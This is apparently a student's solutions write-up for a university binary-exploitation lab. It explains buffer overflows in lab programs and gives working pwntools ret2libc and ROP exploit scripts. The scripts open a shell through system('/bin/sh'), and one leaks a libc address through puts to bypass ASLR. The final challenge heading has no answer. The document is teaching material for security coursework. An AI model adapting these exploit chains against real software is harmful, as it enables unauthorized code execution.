# Laborator 3

### [Q1]: Where are these hundreds of functions?
### Solution to [Q1]:
The functions are here: `/usr/lib/x86_64-linux-gnu/libc.so.6` and the dynamic linker loads these functions into my program's virtual memory. If ASLR is enabled the address of the libc will vary between runs.

## Exercise 1

### [Q2]: Explore the program. What does it do? Where is the vulnerability?
### Solution to [Q2]:
The program checks if a passenger is booked on a specific airline.  The vulnerability lies in the buffer overflow risk when reading the `char name[64];` input in `check_booking()`. The `scanf("%s", name)` call does not limit input length, allowing users to overflow the `name` buffer.

### [Q3]: How does ret2libc fit into this? What are some nice libc functions for exploitation?
### Solution to [Q3]:
We can overwrite the return address to a libc function like `system()` or `exit()`, passing a crafted argument (`/bin/sh`).

### [Q4]: Can we get a shell with this program? How?
### Solution to [Q4]:
We pass the `/bin/sh` argument to the `system()` function.

## Solution to Exercise 1: 
Find address of `pop rdi; ret` gadget:
```c
ropper --file ./bin/ex1 --search "pop rdi"
```

Find address of `/bin/sh`:
```c
pwndbg> search -t string "/bin/sh"
Searching for string: b'/bin/sh\x00'
libc.so.6       0x7ffff7f7042f 0x68732f6e69622f /* '/bin/sh' */
```

Find address of `ret` gadget:
```c
ropper --file ./bin/ex1 --search "ret"
```

Find address of `system()`:
```c
pwndbg> p system
$1 = {int (const char *)} 0x7ffff7dfd740 <__libc_system>
```

```python
#!/usr/bin/env python3
from pwn import *

p = process('./bin/ex1')

p.recvuntil('Select an airline:\n')
p.sendline('0')
p.recvuntil('Please input your name to check your booking:\n')

libc_base = 0x00007ffff7da5000
pop_rdi = libc_base + 0x10f75b
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f

ret = libc_base + 0x2882f

padding = 344

payload = b'A' * padding + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

p.sendline(payload)
p.interactive()
```

## Exercise 2
### [Q5]: Explore the program. What does it do? Where is the vulnerability?
### Solution to [Q5]:
The program reads user input into a 256-byte buffer `souldream`, then copies it into a smaller 64-byte buffer `bad_nightmare` using `memcpy` without proper bounds checking. This causes a buffer overflow in the `nightmare()` function because it copies 256 bytes into a buffer that can only hold 64 bytes.

### [Q6]: Dump the ROP gadgets from the binary. Look at them and think which might be useful and why.
### Solution to [Q6]:
`pop rdi` -> this will pop "/bin/sh" into rdi

`ret` -> this is used for stack alignment
```python
0x00000000004012b5: pop rdi; pop rbp; ret;
0x000000000040101a: ret;
```

### [Q7]: How would you call `dream_msg()` with one of the strings in the binary using a ROP chain? Try it.
### Solution to [Q7]:
```python
#!/usr/bin/env python3

from pwn import *

p = process('./bin/ex2')
context.binary = './bin/ex2'
offset = 72

# pop rdi & pop rbp
pop_rdi = 0x00000000004012b5
souldream = 0x404060
dream_msg = 0x4011b6
ret = 0x000000000040101a
main = 0x401352


payload = flat(
    b'A' * offset,
    ret,
    pop_rdi,
    souldream,
    0xdeadbeef,
    dream_msg
)

#f = open("payload", "wb")
#f.write(payload)
#f.close()

p.sendline(payload)
p.interactive()
```

### [Q8]: How do you get a shell?
### Solution to [Q8]:
Find offset, find `pop rdi; ret` gadget, find address of `souldream`, find address of `system`, place `/bin/sh` at the beginning of the payload and call it later.

## Solution to Exercise 2:
```python
#!/usr/bin/env python3

from pwn import *

p = process('./bin/ex2')
context.binary = './bin/ex2'
elf = ELF('./bin/ex2')

offset = 72 - len(b"/bin/sh;")

# pop rdi & pop rbp
pop_rdi = 0x4012b5

souldream = 0x404060
system = elf.plt['system']

payload = flat(
    b"/bin/sh;",
    b'A' * offset,
    pop_rdi,
    souldream,
    0xdeadbeef,
    system
)


f = open("payload", "wb")
f.write(payload)
f.close()

p.sendline(payload)
p.interactive()
```

## Extra Challenges
### 1. Address Space Who?
### Solution to 1.:
```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./bin/nightmares')
p = process()

offset = 72

# 0x40101a: ret
ret = 0x40101a

# pop rdi; pop rbp; ret;
pop_rdi_rbp = 0x401295

puts = elf.sym["puts"]
main = elf.sym["main"]

payload = flat(
        b'A' * offset,
        ret,
        pop_rdi_rbp,
        elf.got.puts,
        0xdeadbeef,
        puts,
        main,
)
p.sendline(payload)

puts_base = unpack(p.recvlines(7)[6], 'all')

# objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i puts
libc_base = puts_base - 0x87bd0

# strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep -i /bin/sh
binsh = libc_base + 0x1cb42f

# objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep -i system
system = libc_base + 0x58740

payload = flat(
        b'A' * offset,
        pop_rdi_rbp,
        binsh,
        0xdeadbeef,
        system
)

f = open("payload", "wb")
f.write(payload)
f.close()

p.sendline(payload)
p.interactive()
```

### 2. ROP Overdose
### Solution to 2.:
